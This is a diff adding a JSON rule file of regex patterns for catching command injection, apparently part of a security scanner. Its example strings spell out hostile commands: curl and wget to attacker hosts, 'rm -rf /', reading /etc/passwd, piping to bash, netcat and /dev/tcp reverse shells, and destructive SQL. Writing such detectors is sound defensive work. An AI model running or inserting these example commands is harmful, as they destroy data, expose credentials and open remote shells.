@@ -1,0 +1,102 @@
+{
+  "name": "command_injection",
+  "description": "Patterns detecting attempts to execute system commands",
+  "risk": 0.9,
+  "patterns": [
+    {
+      "regex": "curl\\s+(-[a-zA-Z]+\\s+)*['\"]?https?://",
+      "description": "curl command with URL",
+      "examples": ["curl https://evil.com", "curl -s 'http://attacker.com/payload'"]
+    },
+    {
+      "regex": "curl\\s+[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/",
+      "description": "curl command with domain (no scheme)",
+      "examples": ["curl evil.com/payload", "curl agent.example.com/api"]
+    },
+    {
+      "regex": "wget\\s+(-[a-zA-Z]+\\s+)*['\"]?https?://",
+      "description": "wget command with URL",
+      "examples": ["wget http://malware.com/script.sh"]
+    },
+    {
+      "regex": "\\bexec\\s*\\(",
+      "description": "exec() function call",
+      "examples": ["exec('rm -rf /')"]
+    },
+    {
+      "regex": "\\bsystem\\s*\\(",
+      "description": "system() function call",
+      "examples": ["system('cat /etc/passwd')"]
+    },
+    {
+      "regex": "\\beval\\s*\\(",
+      "description": "eval() function call",
+      "examples": ["eval(malicious_code)"]
+    },
+    {
+      "regex": "\\$\\([^)]+\\)",
+      "description": "Command substitution $()",
+      "examples": ["$(curl evil.com)"]
+    },
+    {
+      "regex": "`[^`]+`",
+      "description": "Backtick command execution",
+      "examples": ["`whoami`"]
+    },
+    {
+      "regex": "\\|\\s*(bash|sh|zsh|fish|powershell|cmd)",
+      "description": "Pipe to shell",
+      "examples": ["echo payload | bash"]
+    },
+    {
+      "regex": "\\bspawn\\s*\\(",
+      "description": "spawn() process creation",
+      "examples": ["spawn('sh', ['-c', 'evil'])"]
+    },
+    {
+      "regex": "child_process",
+      "description": "Node.js child_process module",
+      "examples": ["require('child_process')"]
+    },
+    {
+      "regex": "\\brm\\s+-[rf]+",
+      "description": "Destructive rm command",
+      "examples": ["rm -rf /", "rm -f important.txt"]
+    },
+    {
+      "regex": "\\bDROP\\s+(TABLE|DATABASE|INDEX)",
+      "description": "SQL DROP statement",
+      "examples": ["DROP TABLE users;"]
+    },
+    {
+      "regex": "\\bDELETE\\s+FROM\\s+\\w+\\s*(;|WHERE\\s+1)",
+      "description": "SQL mass DELETE",
+      "examples": ["DELETE FROM users;", "DELETE FROM users WHERE 1=1"]
+    },
+    {
+      "regex": "\\bTRUNCATE\\s+TABLE",
+      "description": "SQL TRUNCATE",
+      "examples": ["TRUNCATE TABLE logs;"]
+    },
+    {
+      "regex": "\\bchmod\\s+[0-7]{3,4}|chmod\\s+[+\\-][rwx]",
+      "description": "chmod permission changes",
+      "examples": ["chmod 777 /etc/passwd"]
+    },
+    {
+      "regex": "\\bsudo\\s+",
+      "description": "sudo privilege escalation",
+      "examples": ["sudo rm -rf /"]
+    },
+    {
+      "regex": "\\b(nc|netcat|ncat)\\s+(-[a-zA-Z]+\\s+)*[\\d\\.]+\\s+\\d+",
+      "description": "netcat connection",
+      "examples": ["nc -e /bin/sh attacker.com 4444"]
+    },
+    {
+      "regex": "/dev/(tcp|udp)/",
+      "description": "Bash network redirection",
+      "examples": ["/dev/tcp/attacker.com/4444"]
+    }
+  ]
+}
